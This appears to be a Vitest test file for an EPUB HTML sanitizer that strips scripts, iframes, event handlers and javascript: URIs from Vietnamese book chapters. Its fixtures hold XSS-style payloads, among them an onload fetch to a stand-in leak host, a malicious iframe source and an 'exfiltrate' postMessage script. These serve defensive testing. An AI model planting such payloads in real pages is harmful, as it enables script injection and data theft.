import { describe, it, expect } from "vitest";
import { sanitizeEpubHtml } from "./htmlSanitizer";

describe("sanitizeEpubHtml", () => {
  it("handles empty or falsy inputs", () => {
    expect(sanitizeEpubHtml("")).toBe("");
    expect(sanitizeEpubHtml(null as unknown as string)).toBe("");
  });

  it("removes script elements and their executable contents", () => {
    const raw = `
      <div class="chapter">
        <h1>Chương 1</h1>
        <script>
          window.parent.postMessage("exfiltrate", "*");
        </script>
        <p>Nội dung hợp lệ của chương sách.</p>
      </div>
    `;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).not.toContain("<script");
    expect(clean).not.toContain("window.parent");
    expect(clean).toContain("<h1>Chương 1</h1>");
    expect(clean).toContain("<p>Nội dung hợp lệ của chương sách.</p>");
  });

  it("removes iframe, object, and embed elements", () => {
    const raw = `
      <p>Trước</p>
      <iframe src="https://malicious.site/payload.html"></iframe>
      <object data="malware.swf"></object>
      <p>Sau</p>
    `;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).not.toContain("<iframe");
    expect(clean).not.toContain("<object");
    expect(clean).toContain("<p>Trước</p>");
    expect(clean).toContain("<p>Sau</p>");
  });

  it("preserves native media elements (audio, video, canvas) for rich EPUBs", () => {
    const raw = `
      <div class="audiobook-player">
        <audio controls src="narration.mp3"></audio>
        <video controls src="intro.mp4"></video>
      </div>
    `;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).toContain("<audio");
    expect(clean).toContain("<video");
    expect(clean).toContain('src="narration.mp3"');
  });

  it("strips inline event handlers while preserving tag and other attributes", () => {
    const raw = `
      <img src="cover.jpg" onerror="alert('xss')" onload="fetch('http://leak.com')" alt="Ảnh bìa" class="book-cover" />
      <a href="https://example.com" onclick="doMalicious()">Liên kết</a>
    `;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).not.toContain("onerror");
    expect(clean).not.toContain("onload");
    expect(clean).not.toContain("onclick");
    expect(clean).toContain('src="cover.jpg"');
    expect(clean).toContain('alt="Ảnh bìa"');
    expect(clean).toContain('class="book-cover"');
    expect(clean).toContain('href="https://example.com"');
  });

  it("strips dangerous javascript: URI schemes from href and src", () => {
    const raw = `
      <a href="javascript:alert(1)">Bấm vào đây</a>
      <a href="  JAVASCRIPT:evilCode() ">Bấm vào đây 2</a>
      <img src="javascript:evil()" />
      <a href="./chapter02.xhtml">Chương 2</a>
    `;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).not.toContain("javascript:");
    expect(clean).not.toContain("JAVASCRIPT:");
    expect(clean).toContain('href="./chapter02.xhtml"');
    expect(clean).toContain("Bấm vào đây");
  });

  it("preserves complex valid EPUB book styling, drop caps, and quotes", () => {
    const raw = `
      <div id="c1" class="chapter-flow">
        <h1 class="chapter-title">Chương 1: Bình Minh</h1>
        <p class="paragraph drop-cap" style="line-height: 1.8; text-indent: 1.5em;">
          <span class="first-letter">B</span>ình minh đã lên trên đỉnh núi.
        </p>
        <blockquote class="italic-quote">
          "Không có gì là không thể với một người có quyết tâm."
        </blockquote>
      </div>
    `;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).toContain('id="c1"');
    expect(clean).toContain('class="chapter-flow"');
    expect(clean).toContain('class="chapter-title"');
    expect(clean).toContain('class="paragraph drop-cap"');
    expect(clean).toContain('class="italic-quote"');
    expect(clean).toContain("Bình Minh");
  });

  it("does not break on attributes with angle brackets in quotes", () => {
    const raw = `<img src="image.png" alt="Giá trị a > b và c < d" />`;
    const clean = sanitizeEpubHtml(raw);
    expect(clean).toContain('alt="Giá trị a > b và c < d"');
  });
});
